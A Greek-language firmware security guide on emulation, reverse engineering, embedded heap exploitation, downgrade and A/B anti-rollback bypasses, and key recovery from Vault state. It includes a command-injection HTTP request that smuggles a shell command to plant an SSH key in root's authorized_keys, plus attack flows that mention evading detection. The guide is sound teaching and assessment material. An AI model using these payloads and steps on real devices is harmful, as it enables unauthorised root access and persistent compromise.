#### Παράδειγμα με αρχιτεκτονική MIPS

Για να εξομοιώσετε ένα binary αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian η επιλογή είναι το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για binaries ARM, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για την εξομοίωση.

### Εξομοίωση πλήρους συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα, διευκολύνουν την εξομοίωση ολόκληρου του firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας τη δυναμική ανάλυση.

### Ανακατασκευή διαχωρισμένων και επαληθευμένων root filesystems για εξομοίωση

Αν ένα SquashFS superblock είναι αναγνώσιμο, αλλά οι θέσεις των inode, directory ή fragment-table είναι αδύνατες, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering στο early boot binary και αναπαραγάγετε το γράφημα block-device που δημιουργεί: τα ενσωματωμένα συστήματα μπορεί να εκθέτουν ένα φαινομενικά κανονικό root partition, αλλά να κατασκευάζουν το πραγματικό filesystem με μια αντιστοίχιση `dm-linear` που προσθέτει sectors δανεισμένα από άλλο partition. Οι έλεγχοι μόνο του superblock μπορεί να πετύχουν ακόμη κι όταν όλα τα επόμενα metadata blocks βρίσκονται σε λάθος θέση.<sup>[[11]](#references)</sup>

Διατηρήστε ακριβώς τους αριθμητικούς υπολογισμούς του firmware. Ειδικότερα, προσδιορίστε αν τα μήκη είναι σε bytes, sectors των 512 byte ή σελίδες των 4 KiB· αναπαραγάγετε τις ολισθήσεις και την αποκοπή με την αρχική τους σειρά· και λάβετε υπόψη τις περιοχές τέλους που εξαρτώνται από την τράπεζα σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα αποκόπτει στο όριο των 4 KiB και έπειτα εκφράζει το αποτέλεσμα σε sectors των 512 byte· αν το αντικαταστήσετε με `partition_bytes // 512`, μπορεί να μετατοπιστεί η έκταση που προστίθεται κατά μερικά kilobytes και να καταστραφούν όλοι οι επόμενοι πίνακες SquashFS.<sup>[[11]](#references)</sup>

Μια χρήσιμη ροή εργασίας επικύρωσης είναι η εξής:<sup>[[11]](#references)</sup>

1. Ανακτήστε από το verifier/init binary τη συσκευή προέλευσης, το αρχικό sector και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τις εκτάσεις χωρίς να αλλάξετε τη σημασιολογία της ευθυγράμμισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, αναζητήστε μόνο σε ένα μικρό εύρος γύρω από το προβλεπόμενο όριο και απαιτήστε αρκετές διαδοχικές έγκυρες δομές metadata, αντί να αποδεχτείτε μόνο ένα εύλογο superblock.
4. Εκτελέστε ένα μη τροποποιημένο `unsquashfs` στην ανακατασκευασμένη εικόνα· η επιτυχής διάσχιση όλων των directories και fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση dm-verity υπό τον έλεγχο του αναλυτή

Όταν ο αναλυτής ελέγχει τον kernel, το initramfs και τους εικονικούς δίσκους του QEMU, μπορεί να εκκινήσει ένα τροποποιημένο root αντικαθιστώντας το PID 1 επαλήθευσης του προμηθευτή με ένα μικρό, στατικά συνδεδεμένο init. Αυτή είναι μια **αντικατάσταση της αλυσίδας εκκίνησης σε εργαστηριακό περιβάλλον**, όχι παραβίαση του dm-verity, της υπογραφής RSA, του Secure Boot ή ενός κλειδιού σφραγισμένου σε TPM.<sup>[[11]](#references)</sup>

Το init αντικατάστασης πρέπει να αναπαράγει τα λειτουργικά μέρη της αρχικής διαδικασίας εκκίνησης: να προσαρτήσει το `devtmpfs`, να καλέσει το `setsid()`, να συνδέσει το `/dev/console` με τους file descriptors 0–2, να προσαρτήσει τα `/proc` και `/sys`, να περιμένει να είναι διαθέσιμη η παρεχόμενη block device, να προσαρτήσει το επεξεργασμένο root μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystems του παλιού root, να μεταφέρει το νέο mount στο `/`, να εκτελέσει `chroot` και να καλέσει το `execve()` για το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποτρέπει την ακούσια αποσύνδεση mount points που ανήκουν στο νέο root.<sup>[[11]](#references)</sup>

Διατηρήστε την κατάσταση της συσκευής που μπορεί να τροποποιηθεί ξεχωριστά από το τροποποιημένο, αμετάβλητο root. Ένα overlay qcow2 μπορεί να διατηρήσει την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος, μόνο για ανάγνωση virtio δίσκος παρέχει το επεξεργασμένο SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Αποσφαλμάτωση κατάστασης εικόνας εκτός σύνδεσης

Επιθεωρήστε την επίμονη κατάσταση εκτός του guest όταν οι αργές εκκινήσεις, τα καταστροφικά scripts εκκίνησης ή η αναξιόπιστη καταγραφή κονσόλας δυσκολεύουν τον εντοπισμό της αποτυχίας. Μην προσαρτάτε ποτέ ένα overlay που χρησιμοποιεί μια εκτελούμενη VM· εκθέστε το με το `qemu-nbd`, περιορίστε την ανακάλυψη LVM στο προβλεπόμενο διαμέρισμα NBD και απενεργοποιήστε την ομάδα τόμων πριν την αποσύνδεσή της.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράψτε αρχεία-δείκτες με χρονικές σημάνσεις σε έναν σταθερό τόμο με δυνατότητα εγγραφής και επαληθεύστε τα εκτός σύνδεσης· τα `/dev/kmsg`, οι FIFO και οι προσωρινές κονσόλες μπορεί να δώσουν ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού διεργασιών. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ των επιπέδων πριν αλλάξετε άσχετο κώδικα: `uname -r` σε σχέση με το `/lib/modules/`, τις δυνατότητες του ext4 στον δίσκο σε σχέση με τη διαμόρφωση του kernel, και τη γενιά του Mesa `libGL` σε σχέση με το ABI του DRI driver και τα ονόματα των drivers που προκύπτουν από τα PCI. Ένα στοιχείο μπορεί να υπάρχει και ακόμη και να φορτώνεται επιτυχώς μέσω `dlopen()`, αλλά να παραμένει μη λειτουργικό επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[11]](#references)</sup>

## Δυναμική ανάλυση στην πράξη

Σε αυτό το στάδιο, χρησιμοποιείται για την ανάλυση είτε ένα πραγματικό περιβάλλον συσκευής είτε ένα περιβάλλον εξομοίωσης. Είναι απαραίτητο να διατηρείται πρόσβαση shell στο OS και στο filesystem. Η εξομοίωση μπορεί να μην προσομοιώνει τέλεια τις αλληλεπιδράσεις με το hardware, καθιστώντας αναγκαίες περιστασιακές επανεκκινήσεις της. Η ανάλυση θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται εκτεθειμένες ιστοσελίδες και network services και να διερευνά ευπάθειες του bootloader. Οι έλεγχοι ακεραιότητας του firmware είναι κρίσιμοι για τον εντοπισμό πιθανών backdoor ευπαθειών.

## Τεχνικές ανάλυσης κατά την εκτέλεση

Η ανάλυση κατά την εκτέλεση περιλαμβάνει την αλληλεπίδραση με μια διεργασία ή ένα binary στο περιβάλλον λειτουργίας του, με χρήση εργαλείων όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

Για embedded στόχους χωρίς πλήρες debugger, **αντιγράψτε ένα στατικά συνδεδεμένο `gdbserver`** στη συσκευή και συνδεθείτε σε αυτό απομακρυσμένα:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Αντιστοίχιση μηνυμάτων Zigbee / radio-co-processor

Στους IoT hubs, το RF stack συχνά είναι χωρισμένο ανάμεσα σε ένα **radio MCU** και μια διεργασία userland του Linux. Μια χρήσιμη ροή εργασίας είναι να χαρτογραφήσετε τη διαδρομή:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **parser στην πλευρά του controller** στο radio MCU
3. **πρωτόκολλο κειμένου ή TLV μέσω serial/UART** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στον κύριο daemon
5. **handler / state machine ειδικό για το πρωτόκολλο**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα δυαδικά radio frames σε πρωτόκολλο κειμένου όπως `Group,Command,arg1,arg2,...`, ανακτήστε:

- Τα **message groups** και τους dispatch tables
- Ποια μηνύματα μπορούν να προέρχονται από το **δίκτυο** και ποια από τον ίδιο τον controller
- Τα ακριβή **πεδία διάκρισης ειδικά για τον κατασκευαστή** (για παράδειγμα Zigbee `manufacturer_code` και το προσαρμοσμένο `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τις φάσεις **commissioning**, discovery ή λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση pairing και ελέγξτε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ναι, η υποκλοπή της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, οπότε σημειώστε αν η συσκευή που δοκιμάζεται τους επιβάλλει πράγματι.

### Handlers πρωτοκόλλου ειδικοί για τον κατασκευαστή και προσβασιμότητα που ελέγχεται από FSM

Οι εντολές Zigbee/ZCL ειδικές για τον κατασκευαστή είναι συχνά καλύτερος στόχος από τα τυποποιημένα clusters, επειδή τροφοδοτούν **προσαρμοσμένο κώδικα parsing** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineering στον command dispatcher μέχρι να εντοπίσετε τον **handler αποκλειστικά για τον κατασκευαστή**.
- Ανακτήστε τους πίνακες **κατάστασης FSM**, **event**, **check**, **action** και **επόμενης κατάστασης**.
- Εντοπίστε τις **μεταβατικές καταστάσεις** που προχωρούν αυτόματα, καθώς και τους κλάδους retry/error που τελικά κάνουν reset ή αποδεσμεύουν κατάσταση ελεγχόμενη από τον attacker.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να φτάσει ο daemon στην ευάλωτη κατάσταση, αντί να υποθέτετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, η αναπαραγωγή πακέτων από ένα Python framework μπορεί να είναι υπερβολικά αργή. Μια πιο αξιόπιστη προσέγγιση είναι να προσομοιώσετε μια νόμιμη συσκευή σε πραγματικό hardware (για παράδειγμα ένα **nRF52840**) με stack επιπέδου κατασκευαστή, ώστε να μπορείτε να εκθέσετε τα σωστά **endpoints**, **attributes** και τον χρονισμό του commissioning.

### Κατηγορία σφαλμάτων σε fragmented downloads embedded daemons

Μια επαναλαμβανόμενη κατηγορία σφαλμάτων firmware εμφανίζεται σε λήψεις **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. Το **πρώτο fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και δεσμεύει μνήμη με `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο πεδία **τοπικά στο packet** που ελέγχονται από τον attacker, όπως `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς να ελέγχει αν η αντιγραφή υπερβαίνει το **αρχικό μέγεθος της δεσμευμένης μνήμης**.

Έτσι, ο attacker μπορεί να στείλει:

- Ένα έγκυρο πρώτο fragment με δηλωμένο **μικρό** συνολικό μέγεθος, ώστε να επιβάλει μικρή heap allocation.
- Ένα επόμενο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστογραφημένο μέγεθος τοπικό στο packet, το οποίο περνά τους νέους ελέγχους, αλλά και πάλι προκαλεί overflow στον αρχικά δεσμευμένο buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, το exploitation πρέπει να περιλαμβάνει αρκετή **προσομοίωση συσκευής** ώστε ο στόχος να περάσει στην αναμενόμενη κατάσταση model-download ή blob-download πριν από την αποστολή των κακοσχηματισμένων fragments.

### Ενεργοποίηση `free()` μέσω πρωτοκόλλου

Σε embedded daemons, ο ευκολότερος τρόπος για να ενεργοποιήσετε heap metadata exploitation συχνά δεν είναι να «περιμένετε τον καθαρισμό», αλλά να **αναγκάσετε τη διαχείριση σφαλμάτων του ίδιου του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε κακοσχηματισμένα επόμενα fragments για να οδηγήσετε το FSM σε καταστάσεις **retry** ή **error**.
- Ξεπεράστε το όριο retries, ώστε ο daemon να κάνει **reset το context** και να αποδεσμεύσει τον αλλοιωμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε primitives στην πλευρά του allocator πριν η διεργασία καταρρεύσει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση των chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε primitive εγγραφής. Ένα σταθερό μοτίβο είναι να αλλοιώσετε ένα **size field** ώστε να κατευθύνετε την περιήγηση του allocator σε **fake chunks τοποθετημένα μέσα στον buffer που υπέστη overflow**, αντί να αλλοιώσετε αμέσως πραγματικούς δείκτες bin και να καταρρεύσει η διεργασία.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλού επιπέδου. Οι runtime προστασίες δυαδικών αρχείων είναι σπάνιες στα embedded συστήματα, αλλά όταν υπάρχουν, μπορεί να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις για exploitation fastbin του uClibc (embedded Linux)

- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Μια μεταγενέστερη μεγάλη allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, οπότε κάθε fake chunk πρέπει να περνά τους ελέγχους (εύλογο size, `fd = 0` και τα γειτονικά chunks να θεωρούνται «σε χρήση»).<sup>[[6]](#references)</sup>
- **Binaries χωρίς PIE με ενεργό ASLR:** αν είναι ενεργό το ASLR αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις `.data/.bss` μέσα στο binary παραμένουν σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρη κεφαλίδα heap chunk, ώστε μια fastbin allocation να καταλήξει σε έναν **πίνακα function pointers**.
- **NUL που σταματά το parser:** κατά το parsing JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας παράλληλα τα επόμενα bytes που ελέγχονται από τον attacker για stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** μια ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστό mapping και να μεταφέρει εκεί την εκτέλεση.

## Προετοιμασμένα λειτουργικά συστήματα για ανάλυση Firmware

Λειτουργικά συστήματα όπως το [AttifyOS](https://github.com/adi0x90/attifyos) και το [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προρυθμισμένα περιβάλλοντα για δοκιμές ασφάλειας firmware, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Προετοιμασμένα OS για ανάλυση Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι μια διανομή που έχει σχεδιαστεί για να σας βοηθήσει να αξιολογείτε την ασφάλεια και να κάνετε penetration testing σε συσκευές Internet of Things (IoT). Σας εξοικονομεί πολύ χρόνο, παρέχοντας ένα προρυθμισμένο περιβάλλον με όλα τα απαραίτητα εργαλεία εγκατεστημένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Λειτουργικό σύστημα για δοκιμές embedded security, βασισμένο στο Ubuntu 18.04 και προφορτωμένο με εργαλεία δοκιμών ασφάλειας firmware.

## Επιθέσεις Firmware Downgrade και μη ασφαλείς μηχανισμοί Update

Ακόμη κι όταν ένας κατασκευαστής υλοποιεί ελέγχους κρυπτογραφικών υπογραφών για εικόνες firmware, συχνά παραλείπεται η **προστασία από επαναφορά έκδοσης (downgrade)**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ενσωματωμένο δημόσιο κλειδί, αλλά δεν συγκρίνει την *έκδοση* (ή έναν μονοτονικό μετρητή) της εικόνας που εγκαθίσταται, ένας attacker μπορεί να εγκαταστήσει νόμιμα ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει vulnerabilities που είχαν διορθωθεί.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε μια παλαιότερη υπογεγραμμένη εικόνα**
   * Κατεβάστε την από τη δημόσια πύλη λήψεων, το CDN ή τον ιστότοπο υποστήριξης του κατασκευαστή.
   * Εξαγάγετέ την από συνοδευτικές εφαρμογές για κινητά/desktop (π.χ. από τον φάκελο `assets/firmware/` μέσα σε ένα Android APK).
   * Ανακτήστε την από repositories τρίτων, όπως το VirusTotal, αρχεία του Internet, forums κ.λπ.
2. **Ανεβάστε ή σερβίρετε την εικόνα στη συσκευή** μέσω οποιουδήποτε διαθέσιμου καναλιού update:
   * Web UI, API εφαρμογής για κινητά, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές IoT συσκευές εκθέτουν HTTP(S) endpoints *χωρίς authentication*, τα οποία δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν στην πλευρά του server και ξεκινούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλευτείτε ένα vulnerability που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, εγκαταστήστε ξανά την πιο πρόσφατη εικόνα ή απενεργοποιήστε τα updates για να αποφύγετε τον εντοπισμό, αφού αποκτήσετε persistence.

### Παράδειγμα: Command Injection μετά από Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς απολύμανση, επιτρέποντας την injection αυθαίρετων εντολών (εδώ, την ενεργοποίηση πρόσβασης root μέσω κλειδιού SSH). Οι νεότερες εκδόσεις firmware εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από downgrade καθιστά τη διόρθωση άχρηστη.<sup>[[4]](#references)</sup>

### Εξαγωγή firmware από εφαρμογές για κινητά

Πολλοί προμηθευτές ενσωματώνουν πλήρεις εικόνες firmware στις συνοδευτικές εφαρμογές τους για κινητά, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα συνήθως αποθηκεύονται χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμη και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό hardware.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιάσεις A/B slot

Ορισμένοι vendors υλοποιούν πράγματι ένα anti-downgrade **ratchet**, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, σε μια εντολή recovery ή σε έναν userspace OTA agent). Αν στη συνέχεια ο **bootloader** ελέγχει μόνο την υπογραφή/CRC της εικόνας και εμπιστεύεται τον πίνακα partition ή τα metadata του slot, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.<sup>[[7]](#references)</sup>

Συνηθισμένη αδύναμη σχεδίαση:

- Τα metadata του firmware περιέχουν τόσο έναν περιγραφέα έκδοσης όσο και ένα **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το ratchet της εικόνας με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερες υπογεγραμμένες εικόνες.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο την κεφαλίδα, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά, σε έναν πίνακα partition ή σε έναν generation counter ανά slot, και **δεν είναι κρυπτογραφικά δεσμευμένη** στο ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί ένα primitive **επικύρωσης μίας εικόνας / εκκίνησης άλλης εικόνας** σε συστήματα dual-slot. Αν ο attacker μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο στόχο εκκίνησης χρησιμοποιώντας μια τρέχουσα υπογεγραμμένη εικόνα και μπορεί αργότερα να αντικαταστήσει το slot B πριν από την επανεκκίνηση, ο bootloader ενδέχεται και πάλι να εκκινήσει την υποβαθμισμένη εικόνα, επειδή εμπιστεύεται μόνο τα metadata του slot που έχουν ήδη δεσμευτεί.

Συνηθισμένο μοτίβο κατάχρησης:

1. Μεταφορτώστε ένα **τρέχον υπογεγραμμένο** firmware στο παθητικό slot και εκτελέστε την κανονική ρουτίνα επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτό το slot ως το επόμενο ενεργό.
2. **Μην κάνετε ακόμη επανεκκίνηση**. Επανεκκινήστε τη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια συνεδρία.
3. Εκμεταλλευτείτε παρωχημένη κατάσταση εκκίνησης ή παρωχημένη λογική επιλογής slot, ώστε ο updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προήχθη.
4. Γράψτε ένα **παλαιότερο, αλλά ακόμη υπογεγραμμένο** firmware σε αυτό το slot.
5. Παραλείψτε τη ρουτίνα επικύρωσης που επιβάλλει το ratchet και κάντε απευθείας επανεκκίνηση.
6. Ο bootloader επιλέγει το slot που προήχθη, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί την παλιά εικόνα.

Τι να αναζητήσετε κατά την ανάλυση A/B update implementations:

- Επιλογή slot που προκύπτει από **flags εκκίνησης** τα οποία δεν ανανεώνονται μετά από επιτυχημένη εναλλαγή.
- Μια ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει ένα slot με βάση παρωχημένη κατάσταση αντί για την **τρέχουσα δεσμευμένη διάταξη**.
- Μια συνάρτηση τύπου `part_write_layout()` που απλώς αυξάνει έναν **generation counter** / active flag και δεν αποθηκεύει το hash της επικυρωμένης εικόνας.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν το slot επισημασμένο ως εκκινήσιμο, ακόμη και μετά τη διαγραφή και την επανεγγραφή του περιεχομένου του.

### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Προστατεύονται επαρκώς η μεταφορά και η αυθεντικοποίηση του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται η εικόνα μέσα σε αλυσίδα secure boot (π.χ. οι υπογραφές ελέγχονται από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Είναι τα metadata ενεργοποίησης του slot **δεσμευμένα στο επικυρωμένο firmware digest/έκδοση**, ή μπορεί να τροποποιηθεί ένα slot μετά την προαγωγή του;
* Μετά την επιτυχή εναλλαγή slot, αναγκάζεται η συσκευή να κάνει επανεκκίνηση ή παραμένουν προσβάσιμες στη συνέχεια ρουτίνες update/διαγραφής στην ίδια συνεδρία;
* Εκτελεί ο κώδικας userland πρόσθετους ελέγχους λογικής (π.χ. επιτρεπόμενο partition map, αριθμό μοντέλου);
* Επαναχρησιμοποιούν οι *μερικές* ή οι *εφεδρικές* ροές update την ίδια λογική επικύρωσης;

> 💡  Αν λείπει κάποιο από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε rollback attacks.

## Ευάλωτο firmware για εξάσκηση

Για να εξασκηθείτε στον εντοπισμό ευπαθειών σε firmware, χρησιμοποιήστε τα παρακάτω ευάλωτα firmware projects ως σημείο εκκίνησης.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν μια εικόνα update συνδυάζει μικρά metadata σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάντε πρώτα διαλογή του container πριν δοκιμάσετε brute-force:<sup>[[1]](#references)</sup>

- Κάντε dump των headers, των offsets και των ορίων των γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει μορφή OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι το ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes είναι ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που περιέχει τυχαίο firmware password/session key.
- Το αποσπασμένο υλικό PGP στο ίδιο αρχείο συχνά προστατεύει μόνο την αυθεντικότητα· μην υποθέτετε ότι χρησιμοποιείται για εμπιστευτικότητα.

Αν αποτύχει η στατική αναζήτηση κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP), αναλύστε την **operational decrypt path** αντί να ψάχνετε μόνο για private keys:

- Αποσυμπιέστε το updater / management binary και παρακολουθήστε ποιος διαβάζει το κρυπτογραφημένο blob, ποιο helper/API το αποκρυπτογραφεί και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζητήστε στο εξαγόμενο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και unit files και init scripts.
- Αντιμετωπίστε εντολές `vault operator unseal ...` σε plaintext, recovery keys, bootstrap tokens ή τοπικά KMS auto-unseal scripts ως ισοδύναμα με υλικό private key.

Αν η συσκευή περιλαμβάνει το αρχικό binary του Vault και το storage backend, η αναπαραγωγή αυτού του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

